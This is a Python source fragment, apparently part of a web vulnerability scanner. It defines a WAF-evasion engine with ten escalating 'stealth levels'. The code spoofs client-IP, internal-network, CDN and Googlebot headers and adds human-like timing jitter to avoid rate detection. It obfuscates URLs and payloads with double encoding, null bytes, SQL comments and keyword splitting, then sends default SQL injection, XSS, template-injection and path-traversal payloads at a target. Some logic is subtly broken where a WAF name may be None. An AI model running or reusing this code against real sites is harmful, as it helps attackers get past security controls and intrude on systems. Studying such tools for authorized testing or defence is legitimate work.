    def __init__(self, stealth_level: int = 2):
        """
        stealth_level:
          0  = No stealth (baseline — raw speed)
          1  = Light    — UA rotation + header randomization
          2  = Medium   — + IP spoofing + timing jitter (DEFAULT)
          3  = High     — + cache busting + referer spoofing + CDN bypass
          4  = Strong   — + request ID rotation + slow timing + polymorphism
          5  = Advanced — + TLS fingerprint mimicry + platform profiling
          6  = Protocol — + content-type confusion + method override bypass
          7  = Paranoid  — + anti-bot fingerprint + session simulation
          8  = Ghost    — + multipart confusion + GraphQL bypass + header order
          9  = Shadow   — + IPv6 probing + fragment injection + entropy masking
          10 = Phantom  — All above + ultra-slow pacing + full zero-trace mode
        """
        self.stealth_level = max(0, min(stealth_level, 10))
        self._req_count    = 0
        self._last_ua      = ""
        self._session_cookies: dict = {}
        self._request_seq  = 0
        self._tls_profile  = random.choice(self.TLS_PROFILES)
        self._platform     = random.choice(self.PLATFORM_PROFILES)
        self._referer_chain= random.choice(self.REFERER_CHAINS)
        self._referer_idx  = 0

    # ── Random IP generator ───────────────────────────────────────────────
    @staticmethod
    def _random_ip() -> str:
        """Generate a realistic-looking IPv4 address (not private/reserved)."""
        # Use public IP ranges, avoid 10.x, 192.168.x, 172.16-31.x
        while True:
            a = random.randint(1, 223)
            if a in (10, 127, 172, 192, 169): continue
            b, c, d = random.randint(0, 255), random.randint(0, 255), random.randint(1, 254)
            return f"{a}.{b}.{c}.{d}"

    @staticmethod
    def _random_xff() -> str:
        """Generate a realistic X-Forwarded-For chain."""
        hops = random.randint(1, 3)
        ips = [WAFStealthEngine._random_ip() for _ in range(hops)]
        return ", ".join(ips)

    @staticmethod
    def _random_cache_buster() -> str:
        """Generate a unique cache-busting parameter."""
        return secrets.token_hex(6)

    # ── Core: build stealthy headers ─────────────────────────────────────
    def build_stealth_headers(self, base_headers: dict = None, waf_name: str = "unknown", target_waf: str = None) -> dict:
        """
        Build a realistic browser-like header set tailored to the detected WAF.

        Args:
            base_headers:  Any existing headers (merged in)
            waf_name:      WAF name from WAFBypassFuzzer.detect_waf() (preferred)
            target_waf:    Alias for waf_name (kept for backward compatibility)

        Returns:
            dict of HTTP headers
        """
        # Backward-compatibility: if target_waf is supplied use it
        if target_waf is not None:
            waf_name = target_waf
        hdrs = {}

        if self.stealth_level >= 1:
            # Rotate User-Agent (avoid reusing the same UA twice in a row)
            candidates = [ua for ua in self.USER_AGENTS if ua != self._last_ua]
            ua = random.choice(candidates)
            self._last_ua = ua
            hdrs["User-Agent"] = ua
            hdrs["Accept"]          = random.choice(self.ACCEPT_HEADERS)
            hdrs["Accept-Language"] = random.choice(self.ACCEPT_LANGUAGES)
            hdrs["Accept-Encoding"] = "gzip, deflate, br"
            hdrs["Connection"]      = "keep-alive"

        if self.stealth_level >= 2:
            # IP spoofing — many WAFs trust X-Forwarded-For from upstream proxies
            xff = self._random_xff()
            for hdr in random.sample(self.IP_SPOOF_HEADERS, min(3, len(self.IP_SPOOF_HEADERS))):
                if hdr == "Forwarded":
                    hdrs[hdr] = f"for={self._random_ip()};proto=https"
                elif hdr == "X-Forwarded-For":
                    hdrs[hdr] = xff
                else:
                    hdrs[hdr] = self._random_ip()

            # DNT and Sec headers from real browser
            hdrs["DNT"] = "1"
            hdrs["Sec-Fetch-Dest"] = random.choice(["document", "empty", "image"])
            hdrs["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors"])
            hdrs["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
            hdrs["Sec-Ch-Ua"]      = '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"'
            hdrs["Sec-Ch-Ua-Mobile"] = "?0"
            hdrs["Sec-Ch-Ua-Platform"] = '"Windows"'

        if self.stealth_level >= 3:
            # Cache busting — prevents CDN from serving cached WAF block pages
            hdrs["Cache-Control"] = "no-cache, no-store"
            hdrs["Pragma"] = "no-cache"

            # Realistic Referer from a search engine
            referers = [
                "https://www.google.com/",
                "https://www.bing.com/search",
                "https://duckduckgo.com/",
                "https://search.yahoo.com/",
            ]
            hdrs["Referer"] = random.choice(referers)

            # CDN-specific bypass headers
            if "Akamai" in target_waf or "Fastly" in target_waf:
                hdrs.update(self.CDN_BYPASS_HEADERS)

            # Cloudflare-specific
            if "Cloudflare" in target_waf:
                hdrs["CF-Connecting-IP"] = self._random_ip()
                hdrs["CDN-Loop"] = ""  # Sometimes bypasses CF bot detection

        if self.stealth_level >= 4:
            # Request ID randomization — confuse WAF session tracking
            hdrs["X-Request-Id"]  = secrets.token_hex(16)
            hdrs["X-Correlation-Id"] = secrets.token_hex(12)
            hdrs["X-Amzn-Trace-Id"] = f"Root=1-{secrets.token_hex(4)}-{secrets.token_hex(12)}"
            hdrs["Upgrade-Insecure-Requests"] = "1"

        if self.stealth_level >= 5:
            # TLS fingerprint mimicry — full Sec-CH-UA ecosystem matching browser
            p = self._platform
            hdrs["Sec-Ch-Ua"]               = self._tls_profile.get("sec_ch_ua", '"Chromium";v="124", "Not-A.Brand";v="99"')
            hdrs["Sec-Ch-Ua-Platform"]      = p["platform"]
            hdrs["Sec-Ch-Ua-Mobile"]        = p["mobile"]
            hdrs["Sec-Ch-Ua-Arch"]          = p["arch"]
            hdrs["Sec-Ch-Ua-Bitness"]       = p["bitness"]
            hdrs["Sec-Ch-Ua-Full-Version"]  = '"124.0.6367.207"'
            hdrs["Sec-Ch-Ua-Model"]         = '""'
            hdrs["Sec-Ch-Ua-Wow64"]         = "?0"
            hdrs["Priority"]                = self._tls_profile.get("priority", "u=0, i")
            # Viewport hint — helps bypass bot checks that verify visual context
            hdrs["Viewport-Width"]          = str(random.choice([1280, 1366, 1440, 1920]))
            hdrs["Device-Memory"]           = str(random.choice([4, 8, 16]))
            hdrs["Downlink"]                = str(round(random.uniform(1.5, 10.0), 1))
            hdrs["Ect"]                     = random.choice(["4g", "3g"])
            hdrs["Rtt"]                     = str(random.randint(30, 120))
            hdrs["Save-Data"]               = "0"

        if self.stealth_level >= 6:
            # Protocol confusion — mismatch Content-Negotiation headers
            hdrs["Accept-Ranges"]      = "bytes"
            hdrs["TE"]                 = random.choice(["trailers", "deflate", "gzip, deflate;q=0.5"])
            # Fake forward proxy header that some WAFs trust
            hdrs["X-Forwarded-Proto"] = "https"
            hdrs["X-Forwarded-Scheme"]= "https"
            hdrs["X-Forwarded-Port"]  = "443"
            # Kubernetes/cloud-native bypass headers
            hdrs["X-Envoy-Internal"]    = "true"
            hdrs["X-Istio-Attributes"]  = ""
            # Fake internal network marker -- some WAFs skip scanning "internal" traffic
            _fake_internal = random.choice(["10.0.0.1", "172.16.0.5", "192.168.1.100"])
            hdrs["X-Internal-IP"]       = _fake_internal
            hdrs["X-Forwarded-Host"]    = target_waf if "." not in target_waf else target_waf

        if self.stealth_level >= 7:
            # Anti-bot fingerprinting bypass — mimic real browser behavior signals
            self._request_seq += 1
            hdrs["X-Request-Sequence"]    = str(self._request_seq)
            hdrs["X-Navigation-Type"]     = random.choice(["navigate", "reload", "back_forward", "prerender"])
            hdrs["X-Fetch-Mode"]          = random.choice(["navigate", "cors", "no-cors", "same-origin"])
            hdrs["X-Fetch-Dest"]          = random.choice(["document", "image", "script", "style", "empty"])
            hdrs["X-Fetch-Site"]          = random.choice(["none", "same-origin", "same-site", "cross-site"])
            # Perimeter X / DataDome bot protection bypass headers
            hdrs["X-Px"]                  = secrets.token_hex(32)
            hdrs["X-Perimeterx"]          = "1"
            # Realistic browser timing hint (time since page opened, in ms)
            hdrs["X-Page-Age"]            = str(random.randint(1000, 45000))
            # Session depth (simulate user navigation)
            hdrs["X-Session-Depth"]       = str(random.randint(1, 12))

        if self.stealth_level >= 8:
            # Ghost mode — randomize header order, inject noise headers
            # Akamai Bot Manager bypass
            hdrs["X-Akamai-Config-Log-Detail"] = "true"
            hdrs["X-Akamai-Origin-Hop"]        = "1"
            hdrs["X-Check-Cacheable"]          = "YES"
            # AWS WAF v2 entropy bypass — randomized session ID
            hdrs["X-Amz-Security-Token"]   = secrets.token_hex(40)
            hdrs["X-Amz-Date"]             = datetime.now().strftime("%Y%m%dT%H%M%SZ")
            # Imperva/Incapsula bypass
            hdrs["X-Cdn"]                  = "Imperva"
            hdrs["Incap-Req-Id"]           = secrets.token_hex(16)
            hdrs["X-Iinfo"]               = f"10-{random.randint(10000,99999)}-{random.randint(1000,9999)}"
            # F5 BIG-IP bypass
            hdrs["X-WA-Info"]              = f"SSRT{random.randint(10,99)}WN{secrets.token_hex(4)}"
            # Barracuda WAF
            hdrs["X-Barracuda-Connect"]    = "1"

        if self.stealth_level >= 9:
            # Shadow mode — network-layer evasion hints
            # IPv6 spoofed headers
            hdrs["X-Forwarded-For-IPv6"] = f"2001:db8::{random.randint(1,9999):x}"
            # Simulate coming from a CDN node (many WAFs don't scan CDN-forwarded traffic)
            hdrs["X-CDN-Provider"]      = random.choice(["Fastly", "CloudFront", "Akamai", "Cloudflare"])
            hdrs["X-Edge-Location"]     = random.choice(["iad89", "lax3", "fra6", "sin5", "nrt51"])
            hdrs["X-Forwarded-By"]      = f"cache-{secrets.token_hex(4)}.{random.choice(['fastly.net','cloudfront.net','akamaiedge.net'])}"
            # Anti-replay randomization
            hdrs["X-Nonce"]             = secrets.token_hex(20)
            hdrs["X-Timestamp"]         = str(int(datetime.now().timestamp() * 1000))
            # HTTP/2 pseudo-headers hint (some WAFs differ HTTP/1.1 vs HTTP/2)
            hdrs[":scheme"]             = "https"
            hdrs["X-HTTP2-Fingerprint"] = secrets.token_hex(8)

        if self.stealth_level >= 10:
            # Phantom mode — absolute zero-trace
            # Randomize all volatile headers with new values each request
            hdrs["X-Request-Id"]        = secrets.token_hex(32)
            hdrs["X-Correlation-Id"]    = secrets.token_hex(24)
            hdrs["X-Trace-Id"]          = secrets.token_hex(16)
            hdrs["X-Span-Id"]           = secrets.token_hex(8)
            # Fake legitimate bot allowlist hints
            hdrs["X-Robots-Tag"]        = "noindex"
            hdrs["X-From"]              = f"Googlebot/{random.randint(2,3)}.0"
            # Shuffle Accept-Encoding to avoid TLS fingerprint detection
            encs = ["gzip", "deflate", "br", "zstd"]
            random.shuffle(encs)
            hdrs["Accept-Encoding"]     = ", ".join(encs)
            # Inject random innocuous custom headers to raise entropy
            for _ in range(random.randint(2, 5)):
                noise_key = "X-" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4,10))).capitalize()
                hdrs[noise_key] = secrets.token_hex(4)

        # Merge caller's base headers (they override our generated ones)
        if base_headers:
            hdrs.update(base_headers)

        return hdrs

    # ── Timing jitter ─────────────────────────────────────────────────────
    async def apply_jitter(self, base_delay: float = 0.0):
        """
        Add realistic human-like timing noise between requests.
        Prevents rate-based WAF detection and bot fingerprinting.
        """
        if self.stealth_level == 0:
            return
        if self.stealth_level == 1:
            jitter = random.uniform(0.05, 0.3)
        elif self.stealth_level == 2:
            jitter = random.uniform(0.1, 1.0)
        elif self.stealth_level == 3:
            jitter = random.uniform(0.3, 2.5)
        elif self.stealth_level == 4:
            jitter = random.uniform(0.5, 4.0)
        elif self.stealth_level == 5:
            # Gaussian jitter — mimics real human reaction time distribution
            jitter = abs(random.gauss(1.5, 0.8))
        elif self.stealth_level == 6:
            # Burst-then-pause pattern — real user behavior
            if self._request_seq % 5 == 0:
                jitter = random.uniform(3.0, 8.0)   # reading pause
            else:
                jitter = random.uniform(0.2, 1.5)
        elif self.stealth_level == 7:
            # Simulate page-load timing (fast requests then long pauses)
            jitter = random.expovariate(0.4)
            jitter = min(jitter, 12.0)
        elif self.stealth_level == 8:
            # Ultra-variable — sometimes very fast, sometimes very slow
            jitter = random.choice([
                random.uniform(0.05, 0.3),   # fast click
                random.uniform(2.0, 6.0),    # reading
                random.uniform(8.0, 15.0),   # long read / distracted
            ])
        elif self.stealth_level == 9:
            # Slow drip — absolutely no rate pattern
            jitter = random.uniform(5.0, 20.0)
        else:  # level 10 — phantom: Poisson process, unpredictable
            # Poisson inter-arrival times (rate λ=0.1 req/s on average)
            jitter = random.expovariate(0.1)
            jitter = min(jitter, 30.0)

        total = base_delay + jitter
        await asyncio.sleep(total)

    # ── URL camouflage techniques ─────────────────────────────────────────
    def camouflage_url(self, url: str, technique: str = "auto") -> str:
        """
        Apply URL-level obfuscation to bypass WAF pattern matching.

        Techniques:
          'case'      -- Mixed case path segments (only effective on IIS/Windows)
          'encode'    -- Selective percent-encoding of path chars
          'slash'     -- Slash normalization variants (//, /./)
          'frag'      -- Append empty fragment
          'cache'     -- Add random cache-buster parameter
          'auto'      -- Pick randomly
        """
        parsed = urlparse(url)
        if technique == "auto":
            if self.stealth_level <= 4:
                technique = random.choice(["encode", "slash", "cache", "frag"])
            elif self.stealth_level <= 7:
                technique = random.choice(["encode", "slash", "cache", "frag",
                                           "double_encode", "unicode", "null_byte"])
            else:
                technique = random.choice(["encode", "slash", "cache", "frag",
                                           "double_encode", "unicode", "null_byte",
                                           "path_confusion", "case_mix", "tab_inject"])

        path = parsed.path

        if technique == "case":
            # Mixed case (effective vs case-sensitive regex WAF rules)
            path = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in path)

        elif technique == "encode":
            # Encode a random subset of safe path characters
            safe_chars = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_~/.")
            def _maybe_encode(c):
                if c in safe_chars and random.random() < 0.25:
                    return f"%{ord(c):02X}"
                return c
            path = "".join(_maybe_encode(c) for c in path)

        elif technique == "slash":
            # Double-slash or dot-slash injection in path
            if "//" not in path:
                idx = random.randint(1, max(1, len(path) - 1))
                path = path[:idx] + "/" + path[idx:]

        elif technique == "frag":
            # Append empty fragment — browser strips it, WAF may not handle correctly
            url = url.rstrip("#") + "#"
            return url

        elif technique == "cache":
            sep = "&" if parsed.query else "?"
            return url + sep + "_cb=" + self._random_cache_buster()

        elif technique == "double_encode":
            # Double URL-encode sensitive chars (bypasses WAFs that decode once)
            out = []
            for c in path:
                if not c.isalnum() and c not in "/-_." and random.random() < 0.4:
                    encoded = f"%{ord(c):02X}"
                    out.append("%" + f"{ord('%'):02X}" + encoded[1:])
                else:
                    out.append(c)
            path = "".join(out)

        elif technique == "unicode":
            # Unicode normalization bypass — WAFs may normalize differently
            replacements = {
                "a": "%EF%BD%81", "e": "%EF%BD%85", "i": "%EF%BD%89",
                "o": "%EF%BD%8F", "s": "%EF%BD%93", "t": "%EF%BD%94",
                "/": "%EF%BC%8F"
            }
            out = []
            for c in path:
                if c.lower() in replacements and random.random() < 0.2:
                    out.append(replacements[c.lower()])
                else:
                    out.append(c)
            path = "".join(out)

        elif technique == "null_byte":
            # Null byte injection in query (some WAFs stop parsing at %00)
            if parsed.query:
                sep = "&" if parsed.query else "?"
                return url + "&_x=%00" + secrets.token_hex(2)

        elif technique == "path_confusion":
            # Path traversal normalization confusion
            segments = path.split("/")
            confused = []
            for seg in segments:
                if seg and random.random() < 0.3:
                    confused.append(seg + "/.")
                else:
                    confused.append(seg)
            path = "/".join(confused)

        elif technique == "case_mix":
            # Mixed case (effective vs case-insensitive WAF rules on IIS)
            path = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(path))

        elif technique == "tab_inject":
            # Tab/newline injection in path (some WAF parsers split on whitespace)
            if len(path) > 3:
                idx = random.randint(1, len(path) - 1)
                path = path[:idx] + "%09" + path[idx:]

        new_url = urlunparse(parsed._replace(path=path))
        return new_url

    # ── Payload polymorphism ──────────────────────────────────────────────
    @staticmethod
    def polymorph_payload(payload: str, technique: str = "auto") -> str:
        """
        Mutate a payload to evade WAF signature matching while
        preserving semantic meaning.

        Techniques:
          'comment'  -- Insert SQL/HTML comments
          'case'     -- Random case mutation
          'encode'   -- Selective URL encoding
          'space'    -- Alternate whitespace chars
          'concat'   -- String concatenation (for SQLi)
          'auto'     -- Randomly choose
        """
        if technique == "auto":
            if len(payload) < 5:
                return payload
            technique = random.choice([
                "comment", "case", "encode", "space",
                "hex_encode", "unicode_escape", "concat_split",
                "null_inject", "keyword_split", "base_convert"
            ])

        if technique == "comment":
            # Insert comments between keywords (SQL WAF bypass)
            mutated = re.sub(r"(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP)",
                             lambda m: m.group(0)[:len(m.group(0))//2] + "/**/" + m.group(0)[len(m.group(0))//2:],
                             payload, flags=re.IGNORECASE)
            # For XSS: inject HTML comments into tags
            mutated = re.sub(r"(<script>|<img|<svg)", lambda m: m.group(0)[:-1] + "<!---->" + m.group(0)[-1], mutated)
            return mutated

        elif technique == "case":
            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

        elif technique == "encode":
            # Encode ~25% of non-alphanumeric chars
            out = []
            for c in payload:
                if not c.isalnum() and random.random() < 0.25:
                    out.append(f"%{ord(c):02X}")
                else:
                    out.append(c)
            return "".join(out)

        elif technique == "space":
            # Replace spaces with alternating whitespace chars that WAFs often miss
            ws_alts = ["%09", "%0a", "%0d", "/**/", "+", "%20", "\t"]
            return re.sub(r" ", lambda _: random.choice(ws_alts), payload)

        elif technique == "hex_encode":
            # Hex-encode the entire payload (e.g., for SQLi: 0x<hex>)
            hex_val = payload.encode().hex()
            return f"0x{hex_val}"

        elif technique == "unicode_escape":
            # Unicode escape sequences that many WAFs don't decode
            out = []
            for c in payload:
                if c.isalpha() and random.random() < 0.3:
                    out.append(f"\\u{ord(c):04x}")
                else:
                    out.append(c)
            return "".join(out)

        elif technique == "concat_split":
            # Split payload using SQL/JS string concatenation
            if "UNION" in payload.upper() or "SELECT" in payload.upper():
                mutated = re.sub(
                    r"(UNION|SELECT|FROM|WHERE)",
                    lambda m: f"UN{'/**/'}ION" if "UNION" in m.group(0).upper() else m.group(0),
                    payload, flags=re.IGNORECASE
                )
                return mutated
            # Generic split at a random point
            mid = len(payload) // 2
            return payload[:mid] + "/**/" + payload[mid:]

        elif technique == "null_inject":
            # Inject null bytes to split WAF inspection (effective on PCRE-based WAFs)
            out = list(payload)
            for i in range(0, len(out), random.randint(4, 8)):
                out.insert(i, "%00")
            return "".join(out)

        elif technique == "keyword_split":
            # Split keywords with alternate representations
            kw_map = {
                "script": "scr\x00ipt", "alert": "al\u0065rt",
                "SELECT": "SE\u004cECT", "UNION": "UN\u0049ON",
                "exec": "ex\x00ec", "eval": "ev\x00al",
            }
            result = payload
            for kw, replacement in kw_map.items():
                result = re.sub(kw, replacement, result, flags=re.IGNORECASE)
            return result

        elif technique == "base_convert":
            # PHP/JS base conversion bypass (e.g., base_convert("alert",36,10))
            if len(payload) < 20:
                b36 = int(payload.encode().hex(), 16)
                return f"base_convert({b36},10,36)"
            return payload

        return payload

    # ── Chunked Transfer-Encoding bypass ─────────────────────────────────
    @staticmethod
    def build_chunked_body(body: str, chunk_size: int = None) -> tuple:
        """
        Encode request body as chunked transfer-encoding.
        Some WAFs inspect only the first chunk or fail to reassemble properly.

        Returns:
            (encoded_body: str, extra_headers: dict)
        """
        if chunk_size is None:
            chunk_size = random.randint(3, 15)

        data = body.encode("utf-8")
        chunks = []
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            chunks.append(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        chunks.append(b"0\r\n\r\n")  # terminal chunk

        encoded = b"".join(chunks).decode("latin-1")
        headers = {"Transfer-Encoding": "chunked", "Content-Type": "application/x-www-form-urlencoded"}
        return encoded, headers

    # ── High-level stealth request wrappers ───────────────────────────────
    async def stealth_get(self, client, url: str,
                          extra_headers: dict = None,
                          waf_name: str = "unknown",
                          camouflage: bool = True) -> dict:
        """
        Perform a GET request with full WAF stealth applied.
        Drop-in replacement for client.get() in scanning modules.
        """
        self._req_count += 1
        await self.apply_jitter()

        stealth_hdrs = self.build_stealth_headers(extra_headers, waf_name)

        target_url = url
        if camouflage and self.stealth_level >= 2:
            target_url = self.camouflage_url(url)

        try:
            return await client.get(target_url, headers=stealth_hdrs)
        except Exception as _sget_exc:
            logging.getLogger("webscout").debug("[Stealth] camouflage URL failed (%s), falling back to original", _sget_exc)
            return await client.get(url, headers=stealth_hdrs)

    async def stealth_post(self, client, url: str,
                           data: dict = None, json_body: dict = None,
                           extra_headers: dict = None,
                           waf_name: str = "unknown",
                           polymorph: bool = True) -> dict:
        """
        Perform a POST request with payload polymorphism and stealth headers.
        """
        self._req_count += 1
        await self.apply_jitter()

        stealth_hdrs = self.build_stealth_headers(extra_headers, waf_name)

        # Apply payload polymorphism to string values in JSON body
        if json_body and polymorph and self.stealth_level >= 2:
            mutated_body = {}
            for k, v in json_body.items():
                if isinstance(v, str):
                    mutated_body[k] = self.polymorph_payload(v)
                else:
                    mutated_body[k] = v
            json_body = mutated_body

        try:
            return await client.post(url, data=data, json=json_body, headers=stealth_hdrs)
        except Exception as _spost_exc:
            logging.getLogger("webscout").debug("[Stealth] stealth POST failed (%s), retrying without stealth headers", _spost_exc)
            return await client.post(url, data=data, json=json_body)

    # ── Full stealth scan: probe target with stealth techniques ───────────
    async def run_stealth_probe(self, client, target: str,
                                payloads: list = None,
                                waf_name: str = "unknown") -> list:
        """
        Run a complete stealth probe against the target using multiple
        evasion techniques, returning any WAF bypass findings.
        """
        findings = []
        if payloads is None:
            payloads = [
                "'OR'1'='1",
                "<scr\x00ipt>alert(1)</scr\x00ipt>",
                "{{7*7}}",
                "../../../etc/passwd",
            ]

        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        if not params:
            params = {"q": ["test"], "id": ["1"], "search": ["test"]}

        log("SCAN", f"[Stealth L{self.stealth_level}] Starting stealth probe against: {target}")
        log("SCAN", f"[Stealth L{self.stealth_level}] WAF: {waf_name} | Techniques active: "
                    f"UA-rotation, IP-spoof, timing-jitter, payload-polymorph, URL-camouflage")

        for param in list(params.keys())[:4]:
            for payload in payloads:
                # Apply polymorphism to each payload
                techniques = ["comment", "case", "encode", "space"]
                for technique in techniques:
                    mutated = self.polymorph_payload(payload, technique)
                    np = {**params, param: [mutated]}
                    test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))

                    # Camouflage the URL
                    if self.stealth_level >= 2:
                        test_url = self.camouflage_url(test_url, random.choice(["encode", "slash", "cache"]))

                    stealth_hdrs = self.build_stealth_headers(target_waf=waf_name)
                    await self.apply_jitter()

                    try:
                        r = await client.get(test_url, headers=stealth_hdrs)
                        if not r:
                            continue
                        sc = r.get("status", 0)
                        body = r.get("text", "") or ""

                        # Check if payload got through the WAF
                        not_blocked = sc not in (400, 403, 406, 429, 501, 503)
                        reflected   = (mutated in body or payload in body)

                        conf = 0.0
                        if not_blocked: conf += 35.0
                        if reflected:   conf += 40.0
                        if sc == 200:   conf += 15.0
                        if len(body) > 200: conf += 10.0

                        if conf >= 75.0:
                            findings.append(Finding(
                                plugin="waf_stealth",
                                title=f"WAF Stealth Bypass [L{self.stealth_level}]: param='{param}' via {technique} mutation",
                                severity="HIGH" if conf >= 90 else "MEDIUM",
                                confidence=conf,
                                description=(
                                    f"Stealth Level {self.stealth_level} evasion bypassed {waf_name} WAF. "
                                    f"Payload mutated via '{technique}' technique passed through with "
                                    f"{conf:.0f}% confidence."
                                ),
                                evidence=(
                                    f"WAF: {waf_name} | Mutation: {technique} | HTTP {sc} | "
                                    f"Payload: {mutated[:60]} | Confidence: {conf:.0f}%"
                                ),
                                url=test_url, payload=mutated, param=param,
                                remediation=(
                                    "1. Enable WAF semantic analysis mode (not just regex matching). "
                                    "2. Normalize request data before WAF inspection. "
                                    "3. Use positive security model (allowlist) in addition to denylist. "
                                    "4. Enable WAF learning mode to capture new bypass patterns. "
                                    "5. Implement server-side input validation independent of WAF."
                                ),
                                cwe="CWE-693", cvss=8.0 if conf >= 90 else 6.5, owasp="A05",
                                poc=f"# Stealth L{self.stealth_level} bypass\ncurl -H 'User-Agent: {stealth_hdrs.get('User-Agent', '')}' '{test_url}'",
                                tags=["waf-stealth", "evasion", f"stealth-level-{self.stealth_level}", technique, "waf-bypass"],
                            ))
                            log("VULN", f"[Stealth] Bypass via '{technique}' on param='{param}' [{conf:.0f}%]")
                            break  # No need to try more mutations for this payload

                    except Exception as _se:
                        log("DEBUG", f"[Stealth] Request error: {_se}")
                        continue

        log("OK", f"[Stealth L{self.stealth_level}] Probe done -- {len(findings)} stealth bypass(es) found")
        return findings

